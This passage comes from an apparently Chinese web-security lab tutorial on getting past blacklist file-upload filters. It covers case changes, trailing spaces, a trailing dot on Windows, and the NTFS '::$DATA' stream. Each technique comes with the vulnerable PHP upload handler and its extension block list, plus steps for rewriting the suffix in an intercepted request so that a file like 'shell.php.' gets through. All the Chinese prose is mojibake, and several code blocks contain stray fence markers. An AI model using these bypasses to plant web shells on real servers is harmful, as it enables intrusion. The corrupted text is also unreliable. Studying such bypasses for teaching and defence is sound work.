class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ submit æœ‰å€¼ï¼Œ$deny_ext &#x3D;</p><p>array(â€œ.phpâ€,â€.php5â€,â€.php4â€,â€.php3â€,â€.php2â€,â€php1â€,â€.htmlâ€,â€.htmâ€,â€.phtmlâ€,â€.phtâ€,â€.pHpâ€,â€.</p><p>pHp5â€,â€.pHp4â€,â€.pHp3â€,â€.pHp2â€,â€pHp1â€,â€.Htmlâ€,â€.Htmâ€,â€.pHtmlâ€,â€.jspâ€,â€.jspaâ€,â€.jspxâ€,â€.jswâ€,â€.</p><p>jsvâ€,â€.jspfâ€,â€.jtmlâ€,â€.jSpâ€,â€.jSpxâ€,â€.jSpaâ€,â€.jSwâ€,â€.jSvâ€,â€.jSpfâ€,â€.jHtmlâ€,â€.aspâ€,â€.aspxâ€,â€.</p><p>asaâ€,â€.asaxâ€,â€.ascxâ€,â€.ashxâ€,â€.asmxâ€,â€.cerâ€,â€.aSpâ€,â€.aSpxâ€,â€.aSaâ€,â€.aSaxâ€,â€.aScxâ€,â€.aShxâ€,â€.</p><p>aSmxâ€,â€.cErâ€,â€.sWfâ€,â€.swfâ€);</p><p>ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååœ¨åˆ—è¡¨å†…ç¦æ­¢ä¸Šä¼ ã€‚åŒ…æ‹¬äº†æ‰€æœ‰çš„æ‰§è¡Œè„šæœ¬</p><h2 id="2-5-7-å¤§å°å†™ç»•è¿‡"><a href="#2-5-7-å¤§å°å†™ç»•è¿‡" class="headerlink" title="2.5.7 å¤§å°å†™ç»•è¿‡"></a>2.5.7 å¤§å°å†™ç»•è¿‡</h2><h3 id="å¤§å°å†™ç»•è¿‡æ–¹æ³•"><a href="#å¤§å°å†™ç»•è¿‡æ–¹æ³•" class="headerlink" title="å¤§å°å†™ç»•è¿‡æ–¹æ³•"></a>å¤§å°å†™ç»•è¿‡æ–¹æ³•</h3><p>ä»”ç»†é˜…è¯»é»‘åå•ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰è¢«å¿½ç•¥çš„åç¼€åï¼Œå½“å‰å¯ä»¥ä½¿ç”¨ phP ç»•è¿‡</p><h3 id="å¤§å°å†™ç»•è¿‡åŸç†"><a href="#å¤§å°å†™ç»•è¿‡åŸç†" class="headerlink" title="å¤§å°å†™ç»•è¿‡åŸç†"></a>å¤§å°å†™ç»•è¿‡åŸç†</h3><p>æœ‰çš„ä¸Šä¼ æ¨¡å— åç¼€åé‡‡ç”¨é»‘åå•åˆ¤æ–­ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹åç¼€åçš„å¤§å°å†™è¿›è¡Œä¸¥æ ¼åˆ¤æ–­ï¼Œå¯¼è‡´å¯ä»¥æ›´æ”¹åç¼€å¤§å°å†™å¯ä»¥è¢«ç»•è¿‡ã€‚å¦‚ PHPã€ Phpã€ phPã€pHp</p><p>å¤§å°å†™ç»•è¿‡ä»£ç åˆ†æ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line">è·å–æ–‡ä»¶åç¼€åè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåç¼€åœ¨è¿™ä¸ªå­—å…¸é‡Œå°±ç¦æ­¢ä¸Šä¼ ã€‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$deny_ext</span>=</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-5-8-ç©ºæ ¼ç»•è¿‡"><a href="#2-5-8-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="2.5.8 ç©ºæ ¼ç»•è¿‡"></a>2.5.8 ç©ºæ ¼ç»•è¿‡</h2><p>ç©ºæ ¼ç»•è¿‡ä¸Šä¼ æ–¹æ³•<br>æŠ“åŒ…ä¸Šä¼ ï¼Œåœ¨åç¼€ååæ·»åŠ ç©ºæ ¼</p><h3 id="ç©ºæ ¼ç»•è¿‡åŸç†"><a href="#ç©ºæ ¼ç»•è¿‡åŸç†" class="headerlink" title="ç©ºæ ¼ç»•è¿‡åŸç†"></a>ç©ºæ ¼ç»•è¿‡åŸç†</h3><p>åœ¨ä¸Šä¼ æ¨¡å—é‡Œï¼Œé‡‡ç”¨é»‘åå•ä¸Šä¼ ï¼Œå¦‚æœæ²¡æœ‰å¯¹ç©ºæ ¼è¿›è¡Œå»æ‰å¯èƒ½è¢«ç»•è¿‡ã€‚</p><h3 id="ç©ºæ ¼ç»•è¿‡ä»£ç åˆ†æ"><a href="#ç©ºæ ¼ç»•è¿‡ä»£ç åˆ†æ" class="headerlink" title="ç©ºæ ¼ç»•è¿‡ä»£ç åˆ†æ"></a>ç©ºæ ¼ç»•è¿‡ä»£ç åˆ†æ</h3><p>æ£€æµ‹ submit å ä¸Šä¼ ç›®å½•å­˜åœ¨æ—¶ï¼Œè¿›å…¥é»‘åå•åˆ¤æ–­ã€‚å¦‚æœæ–‡ä»¶åç¼€ååœ¨é»‘åå•é‡Œã€‚ä¸å…è®¸ä¸Šä¼ ï¼Œä½†æ˜¯æ–‡ä»¶åç¼€åï¼Œæ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ï¼Œå¯ä»¥æ·»åŠ ç©ºæ ¼ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-9-åˆ©ç”¨-windows-ç³»ç»Ÿç‰¹å¾ç»•è¿‡ä¸Šä¼ "><a href="#2-5-9-åˆ©ç”¨-windows-ç³»ç»Ÿç‰¹å¾ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.9 åˆ©ç”¨ windows ç³»ç»Ÿç‰¹å¾ç»•è¿‡ä¸Šä¼ "></a>2.5.9 åˆ©ç”¨ windows ç³»ç»Ÿç‰¹å¾ç»•è¿‡ä¸Šä¼ </h2><h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><p>æŠ“åŒ…ä¿®æ”¹åœ¨&#x3D;&#x3D;åç¼€åååŠ ä¸Š.&#x3D;&#x3D;å³å¯ç»•è¿‡ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ windows ä¸­æ–‡ä»¶åç¼€ååçš„&#x3D;&#x3D;â€™.â€™&#x3D;&#x3D; ç³»ç»Ÿä¼šè‡ªåŠ¨å¿½ç•¥.æ‰€ä»¥ <strong>shell.php. åƒ shell.php çš„æ•ˆæœä¸€æ ·ã€‚</strong>æ‰€ä»¥å¯ä»¥åœ¨æ–‡ä»¶ååé¢åŠ ä¸Š.ç»•è¿‡ã€‚</p><h3 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>åŒæ ·æ˜¯é»‘åå•ç¦æ­¢ä¸Šä¼ ï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ .php.è¿™ç§æ–‡ä»¶åç¼€ã€‚<br>æ²¡æœ‰åˆ é™¤æ–‡ä»¶æœ«å°¾çš„ç‚¹çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">```php</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br></pre></td></tr></table></figure><h2 id="2-5-10-NTFS-äº¤æ¢æ•°æ®æµ-DATA-ç»•è¿‡ä¸Šä¼ "><a href="#2-5-10-NTFS-äº¤æ¢æ•°æ®æµ-DATA-ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.10 NTFS äº¤æ¢æ•°æ®æµ$DATA ç»•è¿‡ä¸Šä¼ "></a>2.5.10 NTFS äº¤æ¢æ•°æ®æµ$DATA ç»•è¿‡ä¸Šä¼ </h2><p>NTFS äº¤æ¢æ•°æ®æµ::$DATA ç»•è¿‡ä¸Šä¼ æ–¹æ³•<br>burpsuite æŠ“åŒ…ï¼Œä¿®æ”¹åç¼€åä¸º php::$DATA</p><h3 id="NTFS-äº¤æ¢æ•°æ®æµ-DATA-ç»•è¿‡ä¸Šä¼ åŸç†"><a href="#NTFS-äº¤æ¢æ•°æ®æµ-DATA-ç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="NTFS äº¤æ¢æ•°æ®æµ::$DATA ç»•è¿‡ä¸Šä¼ åŸç†"></a>NTFS äº¤æ¢æ•°æ®æµ::$DATA ç»•è¿‡ä¸Šä¼ åŸç†</h3><p>å¦‚æœåç¼€åæ²¡æœ‰å¯¹::$DATA è¿›è¡Œåˆ¤æ–­ï¼Œåˆ©ç”¨ windows ç³»ç»Ÿ NTFS ç‰¹å¾å¯ä»¥ç»•è¿‡ä¸Šä¼ ã€‚</p><h3 id="NTFS-äº¤æ¢æ•°æ®æµ-DATA-ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#NTFS-äº¤æ¢æ•°æ®æµ-DATA-ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="NTFS äº¤æ¢æ•°æ®æµ::$DATA ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>NTFS äº¤æ¢æ•°æ®æµ::$DATA ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><p>$deny_ext&#x3D;array(â€œ.phpâ€,â€.php5â€,â€.php4â€,â€.php3â€,â€.php2â€,â€.htmlâ€,â€.htmâ€,â€.phtmlâ€,â€.phtâ€,â€.pHpâ€,â€.pHp5â€,â€.pHp4â€,â€.pHp3â€,â€.pHp2â€,â€.Htmlâ€,â€.Htmâ€,â€.pHtmlâ€,â€.jspâ€,â€.jspaâ€,â€.jspxâ€,â€.jswâ€,â€.jsvâ€,â€.jspfâ€,â€.</p><p>jtmlâ€,â€.jSpâ€,â€.jSpxâ€,â€.jSpaâ€,â€.jSwâ€,â€.jSvâ€,â€.jSpfâ€,â€.jHtmlâ€,â€.aspâ€,â€.aspxâ€,â€.asaâ€,â€.asaxâ€,â€.</p><p>ascxâ€,â€.ashxâ€,â€.asmxâ€,â€.cerâ€,â€.aSpâ€,â€.aSpxâ€,â€.aSaâ€,â€.aSaxâ€,â€.aScxâ€,â€.aShxâ€,â€.aSmxâ€,â€.cErâ€,â€.</p><p>sWfâ€,â€.swfâ€,â€.htaccessâ€);</p><p>åŒæ 